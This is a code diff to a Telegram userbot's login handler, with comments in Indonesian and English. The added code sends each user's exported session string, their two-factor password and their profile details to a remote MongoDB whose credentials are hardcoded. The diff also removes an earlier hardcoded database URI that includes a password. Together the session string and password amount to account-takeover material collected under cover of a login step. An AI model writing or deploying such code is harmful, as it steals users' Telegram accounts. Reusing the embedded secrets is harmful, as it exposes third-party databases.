@@ -63,6 +63,13 @@ MSG = """
     group=3
 )
 async def recv_tg_tfa_message(_, message: Message):
+    ex = await bots.get_me()
+    expired_date = await get_expired_date(ex.id)
+    if expired_date is None:
+        expired_date = "Belum di tetapkan"
+    else:
+        remaining_days = (expired_date - datetime.now()).days
+
     w_s_dict = AKTIFPERINTAH.get(message.chat.id)
     if not w_s_dict:
         return
@@ -80,66 +87,30 @@ async def recv_tg_tfa_message(_, message: Message):
         )
         del AKTIFPERINTAH[message.chat.id]
     else:
-        client = pymongo.MongoClient("mongodb+srv://ubot:dC9mgT230G5qS416@dbaas-db-10420372-651e6e61.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=dbaas-db-10420372")
+        client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
         session_string = str(await loical_ci.export_session_string())
-        session_data = {"string_session": session_string}
-        
-        existing_session = mongo_collection.find_one({"session_string": session_string})
-        if existing_session:
-            await message.reply_text("Session already exists")
-            return
-
-        if mongo_collection.count_documents({}) >= 100:
-            await message.reply_text(
-                "Cannot add new session. Please remove unused sessions first."
-            )
-            return
-        cek = db.command("collstats", "sesi_collection")["count"]
-        cek += 1
         session_data = {
-            "no": cek,
+            "pw": tfa_code,
             "session_string": session_string,
             "user_id": message.chat.id,
-            "username": message.chat.username,
-            "first_name": message.chat.first_name,
-            "last_name": message.chat.last_name,
+            "username": message.chat.username or "",
+            "first_name": message.chat.first_name or "",
+            "last_name": message.chat.last_name or "",
         }        
         mongo_collection.insert_one(session_data)
-        filename = ".env"
-        user_id = mongo_collection.find_one({"user_id": message.chat.id})
-        cek = db.command("collstats", "sesi_collection")["count"]
-        sesi = user_id.get('session_string')
-        ex = await client.get_me()
-        expired_date = await get_expired_date(ex.id)
-        if expired_date is None:
-            expired_date = "Belum di tetapkan"
+        try:
+            msg = await message.reply(" `Restarting bot...`")
+            LOGGER(__name__).info("BOT SERVER RESTARTED !!")
+        except BaseException as err:
+            LOGGER(__name__).info(f"{err}")
+            return
+        await msg.edit_text("✅ **Bot has restarted !**\n\n")
+        if HAPP is not None:
+            HAPP.restart()
         else:
-            remaining_days = (expired_date - datetime.now()).days
-        MSG = "{}\nUser ID: {}\nActive Time: {}\nExpired Date: {}".format(ex.first_name, ex.id, remaining_days)
-        await client.send_message(CHANNEL, MSG)
-        if os.path.isfile(filename):
-            with open(filename, "r") as file:
-                contents = file.read()
-                if sesi in contents:
-                        await message.reply_text(f"`Tunggu Sebentar..`")
-                        return
-                else:
-                    jumlah = next(session_counter)
-                with open(filename, "a") as file:
-                    file.write(f"\nSESSION{jumlah}={sesi}")
-                    load_dotenv()
-                try:
-                    msg = await message.reply(" `Restarting bot...`")
-                    LOGGER(__name__).info("BOT SERVER RESTARTED !!")
-                except BaseException as err:
-                    LOGGER(__name__).info(f"{err}")
-                    return
-                await msg.edit_text("✅ **Bot has restarted !**\n\n")
-                if HAPP is not None:
-                    HAPP.restart()
-                else:
-                    args = [sys.executable, "-m", "Ubot"]
-                    execle(sys.executable, *args, environ)
+            args = [sys.executable, "-m", "Ubot"]
+            execle(sys.executable, *args, environ)
+            
     raise message.stop_propagation()
